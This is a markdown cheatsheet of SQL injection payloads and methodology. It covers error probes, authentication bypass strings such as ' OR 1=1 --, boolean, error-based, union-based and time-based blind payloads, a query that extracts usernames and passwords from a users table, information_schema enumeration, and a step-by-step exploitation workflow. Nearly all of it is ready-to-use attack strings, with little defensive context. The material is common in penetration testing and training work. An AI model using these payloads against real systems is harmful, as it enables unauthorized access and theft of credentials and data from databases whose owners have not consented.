# 💉 SQL Injection (SQLi) Cheatsheet

> Practical payloads and methodology for identifying and exploiting SQL Injection

---

## 📌 Initial Detection

```sql
'
"
`
') 
```

👉 Look for:

* SQL errors
* Response changes
* Server crashes

---

## ⚡ Authentication Bypass

```sql
' OR '1'='1
' OR 1=1 --
admin' --
```

---

## 🔍 Boolean-Based Testing

```sql
' AND 1=1 --
' AND 1=2 --
```

👉 Difference in response = vulnerable

---

## 💣 Error-Based Injection

```sql
' AND updatexml(1,concat(0x7e,(SELECT version())),1)
' AND extractvalue(1,concat(0x7e,(SELECT database())))
```

---

## 🧠 Union-Based Injection

### Find Columns

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

---

### Extract Data

```sql
' UNION SELECT null,null --
' UNION SELECT null,version() --
' UNION SELECT null,username,password FROM users --
```

---

## ⏳ Time-Based (Blind SQLi)

```sql
' AND SLEEP(5) --
' AND IF(1=1,SLEEP(5),0) --
```

---

## 🔐 Useful Enumeration Queries

```sql
SELECT database()
SELECT user()
SELECT version()
```

---

## 🧬 Extract Tables

```sql
' UNION SELECT table_name,null FROM information_schema.tables --
```

---

## 📍 Common Injection Points

* Login forms
* URL parameters
* Cookies
* Headers (User-Agent, Referer)

---

## 🔎 Testing Workflow

1. Inject `'` → check error
2. Try boolean-based payloads
3. Identify number of columns
4. Use UNION to extract data
5. Switch to blind SQLi if needed

---

## 🛠️ Tools (After Manual Testing)

* sqlmap
* Burp Suite

---

## 🧠 Pro Tips

* Always compare responses carefully
* Small differences = vulnerability
* Don’t rely only on errors

---

## ⚠️ Key Insight

SQLi is not about payloads—it’s about **understanding query behavior**.
